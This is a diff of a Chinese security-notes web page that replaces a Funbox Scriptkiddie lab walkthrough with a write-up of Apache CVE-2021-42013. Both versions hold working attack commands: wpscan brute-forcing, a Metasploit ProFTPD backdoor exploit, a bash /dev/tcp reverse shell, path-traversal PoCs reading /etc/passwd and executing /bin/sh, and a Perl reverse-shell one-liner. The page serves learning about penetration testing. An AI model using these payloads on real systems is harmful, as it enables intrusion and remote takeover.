@@ -9,17 +9,17 @@
       
       
       
-        <link rel="prev" href="../Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A33.%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-6339%EF%BC%89/">
+        <link rel="prev" href="../XXE/">
       
       
-        <link rel="next" href="../Gigachad%201/">
+        <link rel="next" href="../driftingblues7_vh/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.14">
     
     
       
-        <title>Funbox Scriptkiddie - 陈奕霖</title>
+        <title>Apache远程代码执行(CVE-2021-42013) - 陈奕霖</title>
       
     
     
@@ -67,7 +67,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#_1" class="md-skip">
+        <a href="#apachecve-2021-42013" class="md-skip">
           跳转至
         </a>
       
@@ -102,7 +102,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Funbox Scriptkiddie
+              Apache远程代码执行(CVE-2021-42013)
             
           </span>
         </div>
@@ -519,123 +519,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Funbox Scriptkiddie
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../Funbox%20Scriptkiddie/" class="md-nav__link">
         Funbox Scriptkiddie
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    一、信息收集
-  </a>
-  
-    <nav class="md-nav" aria-label="一、信息收集">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-ip" class="md-nav__link">
-    1. 获取靶机IP
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2" class="md-nav__link">
-    2. 扫描端口
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3-web" class="md-nav__link">
-    3. 进入web页面
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#4" class="md-nav__link">
-    4. 扫目录
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    二、漏洞利用&amp;提权
-  </a>
-  
-    <nav class="md-nav" aria-label="二、漏洞利用&amp;提权">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-wpscan" class="md-nav__link">
-    1. 用wpscan扫描
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2_1" class="md-nav__link">
-    2. 查看下端口协议是否有漏洞
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3-msfconsole" class="md-nav__link">
-    3. 用msfconsole框架
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#4-shell" class="md-nav__link">
-    4. shell反弹
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -869,11 +757,66 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Apache远程代码执行(CVE-2021-42013)
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Apache远程代码执行(CVE-2021-42013)
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    一、漏洞描述
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    二、影响版本
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    三、漏洞利用
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1056,6 +999,8 @@
   
   
   
+    
+  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -1065,83 +1010,22 @@
       
         <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
-    一、信息收集
+    一、漏洞描述
   </a>
-  
-    <nav class="md-nav" aria-label="一、信息收集">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-ip" class="md-nav__link">
-    1. 获取靶机IP
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2" class="md-nav__link">
-    2. 扫描端口
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3-web" class="md-nav__link">
-    3. 进入web页面
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#4" class="md-nav__link">
-    4. 扫目录
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
-    二、漏洞利用&amp;提权
-  </a>
-  
-    <nav class="md-nav" aria-label="二、漏洞利用&amp;提权">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-wpscan" class="md-nav__link">
-    1. 用wpscan扫描
+    二、影响版本
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#2_1" class="md-nav__link">
-    2. 查看下端口协议是否有漏洞
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    三、漏洞利用
   </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3-msfconsole" class="md-nav__link">
-    3. 用msfconsole框架
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#4-shell" class="md-nav__link">
-    4. shell反弹
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -1160,71 +1044,32 @@
                   
 
 
-  <h1>Funbox Scriptkiddie</h1>
-
-<h2 id="_1">一、信息收集</h2>
-<h3 id="1-ip">1. 获取靶机IP</h3>
-<p>(在扫描靶机IP过程中扫不到IP，更改下靶机的配置文件)</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/2021091417260460.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<h3 id="2">2. 扫描端口</h3>
-<p>nmap -sC -sV 192.168.8.144</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/20210914172604167.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/2021091417260484.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<h3 id="3-web">3. 进入web页面</h3>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/20210914172604239.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<h3 id="4">4. 扫目录</h3>
-<p>发现网站是wordpress搭建的</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/2021091417260482.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/2021091417260455.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<h2 id="_2">二、漏洞利用&amp;提权</h2>
-<h3 id="1-wpscan">1. 用wpscan扫描</h3>
-<p><strong>1)枚举用户名</strong></p>
-<p>wpscan --url http://192.168.8.144/ --enunerate u</p>
-<p>用户名有admin</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/2021091417300832.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<p>2)爆破密码</p>
-<p>wpscan --url http://192.168.8.144/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin -t 5</p>
-<p>爆了好久没结果</p>
-<h3 id="2_1">2. 查看下端口协议是否有漏洞</h3>
-<p>searchsploit ProFTPD 1.3.3c</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/20210914173007963.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<h3 id="3-msfconsole"><strong>3. 用msfconsole框架</strong></h3>
-<p>用 unix/ftp/proftpd_133c_backdoor</p>
-<p>设置靶机和kali的IP</p>
-<p>设置payload</p>
-<div class="highlight"><pre><span></span><code>serach ProFTPD 1.3.3c 
-
-use exploit/unix/ftp/proftpd_133c_backdoor
-
-show options
-
-set RHOSTS 192.168.8.144
-
-show payloads
-
-set payload payload/cmd/unix/reverse
-
-show options
-
-set LHOST 192.168.8.142
-
-exploit
+<h1 id="apachecve-2021-42013">Apache远程代码执行(CVE-2021-42013)</h1>
+<h3 id="_1">一、漏洞描述</h3>
+<p>在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷。攻击者可以使用路径遍历攻击将 URL 映射到预期文档根目录之外的文件。如果文档根目录之外的文件不受“要求全部拒绝”的保护，则这些请求可能会成功。此外，此缺陷可能会泄漏 CGI 脚本等解释文件的来源。已知此问题已被广泛利用。此问题仅影响 Apache 2.4.49 而不是早期版本。</p>
+<h3 id="_2">二、影响版本</h3>
+<ul>
+<li>CVE-2021-41773 影响范围为2.4.49</li>
+<li>CVE-2021-42013 影响范围为2.4.49/50</li>
+</ul>
+<h3 id="_3">三、漏洞利用</h3>
+<p>从标头获取到apache服务端信息为2.4.50</p>
+<p><img alt="image-20230829175354689" src="../apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.assets/image-20230829175354689.png" /></p>
+<p>验证漏洞，获取到etc/passwd中的内容，</p>
+<div class="highlight"><pre><span></span><code>poc:/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
 </code></pre></div>
-<p><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" /></p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/2021091417300833.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<p>得到一个root权限编辑</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/20210914173007962.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" /></p>
-<h3 id="4-shell">4. shell反弹</h3>
-<p>在kali开启一个监听</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/20210914173007971.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<p>构造一个payload：</p>
-<p>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.8.142/6666 0&gt;&amp;1'</p>
-<p>在msf中执行</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/20210914173007966.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<p>kali获取root权限</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/20210914173007987.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
-<p>获取flag：</p>
-<p><img alt="img" src="../Funbox%20Scriptkiddie.assets/20210914173007991.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑</p>
+<p>构造poc 验证远程代码执行</p>
+<p><img alt="image-20230829175400427" src="../apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.assets/image-20230829175400427.png" /></p>
+<div class="highlight"><pre><span></span><code>poc:/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
+</code></pre></div>
+<p>更改请求包为POST，嵌入要执行的命令，获取到/tmp下的文件</p>
+<p><img alt="image-20230829175408250" src="../apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.assets/image-20230829175408250.png" /></p>
+<p>反弹shell，尝试用bash等反弹失败，尝试用perl进行反弹</p>
+<p>起一个监听，执行payload，反弹成功</p>
+<div class="highlight"><pre><span></span><code>poc：
+perl -e &#39;use Socket;$i=&quot;192.168.8.182&quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
+</code></pre></div>
+<p><img alt="image-20230829175415031" src="../apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.assets/image-20230829175415031.png" /></p>
 
 
 
